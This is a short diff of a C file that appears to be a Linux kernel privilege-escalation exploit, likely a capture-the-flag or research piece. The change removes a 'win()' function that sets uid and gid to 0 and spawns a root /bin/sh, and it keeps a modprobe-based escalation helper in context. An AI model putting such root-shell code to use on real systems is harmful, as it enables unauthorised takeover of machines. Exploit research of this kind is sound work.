@@ -60,19 +60,6 @@ static void x64dump(void *buf, u32 num) {
 }
 
 
-static void win() {
-    setuid(0);
-    setgid(0);
-    if (getuid() != 0) {
-        puts("[-] not root");
-        exit(-1);
-    }
-    puts("[+] win!");
-    char *argv[] = { "/bin/sh", NULL };
-    char *envp[] = { NULL };
-    execve("/bin/sh", argv, envp);
-    fatal("execve");
-}
 
 char exe_path[0x100];
 static void setup_modprobe(const char *filepath) {
